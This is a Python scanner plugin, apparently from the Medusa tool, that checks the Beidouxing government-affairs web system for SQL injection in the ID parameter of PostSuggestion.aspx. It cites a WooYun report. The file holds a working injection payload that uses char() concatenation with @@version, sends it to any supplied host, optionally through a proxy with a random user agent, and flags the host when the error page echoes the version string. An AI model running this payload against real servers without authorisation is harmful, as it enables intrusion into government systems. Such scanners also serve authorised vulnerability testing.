#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 北斗星政务PostSuggestion.aspx SQL注入
referer: http://www.wooyun.org/bugs/wooyun-2010-076739
author: Lucifer
description: /sssweb/SuggestionCollection/PostSuggestion.aspx ID参数存在SQL注入。
'''
import urllib
import requests

def UrlProcessing(url):
    if url.startswith("http"):#判断是否有http头，如果没有就在下面加入
        res = urllib.parse.urlparse(url)
    else:
        res = urllib.parse.urlparse('http://%s' % url)
    return res.scheme, res.hostname, res.port

payload = "/sssweb/SuggestionCollection/PostSuggestion.aspx?ID=1%27AnD+1=char(73)%2Bchar(73)%2Bchar(73)%2B@@version--"
def medusa(Url,RandomAgent,ProxyIp):

    scheme, url, port = UrlProcessing(Url)
    if port is None and scheme == 'https':
        port = 443
    elif port is None and scheme == 'http':
        port = 80
    else:
        port = port
    global resp
    global resp2
    try:
        payload_url = scheme+"://"+url+payload
        headers = {
            'Accept-Encoding': 'gzip, deflate',
            'Accept': '*/*',
            'User-Agent': RandomAgent,
        }
        #s = requests.session()
        if ProxyIp!=None:
            proxies = {
                # "http": "http://" + str(ProxyIps) , # 使用代理前面一定要加http://或者https://
                "http": "http://" + str(ProxyIp)
            }
            resp = requests.get(payload_url, headers=headers, proxies=proxies, timeout=5, verify=False)
        elif ProxyIp==None:
            resp = requests.get(payload_url,headers=headers, timeout=5, verify=False)
        con = resp.text
        code = resp.status_code
        if code==500 and con.lower().find('iiimicrosoft')!=-1:
            Medusa = "{} 存在北斗星政务PostSuggestion.aspx SQL注入漏洞\r\n漏洞详情:\r\nPayload:{}\r\n".format(url, payload_url)
            return (Medusa)
    except Exception as e:
        pass